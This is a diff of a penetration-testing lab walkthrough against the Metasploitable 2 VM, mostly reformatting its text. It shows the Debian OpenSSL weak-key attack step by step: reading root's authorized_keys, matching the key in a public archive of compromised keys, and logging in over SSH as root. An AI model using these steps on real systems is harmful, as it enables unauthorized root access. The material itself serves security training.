@@ -218,24 +218,39 @@ The OpenSSH version running on the system is vulnerable to the Debian’s OpenSS
 For this, we will need to acquire a list of authorized keys which we can do using an unprivileged shell by reading the /root/.ssh/authorized_keys file.
 
 cat /root/.ssh/authorized_keys
+
 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
-Now that we have an authorized key, we need to find out the private key paired with the authorized public key. We can get the archive of compromised key pairs provided by the folks at Offensive Security on their Github – RSA 2048.
+
+Now that we have an authorized key, we need to find out the private key paired with the authorized public key.
+
+We can get the archive of compromised key pairs provided by the folks at Offensive Security on their Github – RSA 2048.
+
 After extracting the archive, we can locate the private key file paired with the public key and use it to SSH in as the root user.
 
 root@kali:\~/rsa/2048# grep -l AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== *.pub
 57c3115d77c56390332dc5c49978627a-5429.pub
-root@kali:~# ssh -i /rsa/2048/57c3115d77c56390332dc5c49978627a-5429 root@192.168.0.14
+
+root@kali:\~# ssh -i /rsa/2048/57c3115d77c56390332dc5c49978627a-5429 root@192.168.0.14
+
 Public key 57:c3:11:5d:77:c5:63:90:33:2d:c5:c4:99:78:62:7a blacklisted (see ssh-vulnkey(1)); continuing anyway
+
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
 The programs included with the Ubuntu system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
+
 Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
 applicable law.
+
 To access official Ubuntu documentation, please visit:
+
 http://help.ubuntu.com/
+
 You have mail.
+
 root@metasploitable:~# id
+
 uid=0(root) gid=0(root) groups=0(root)
  
  8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
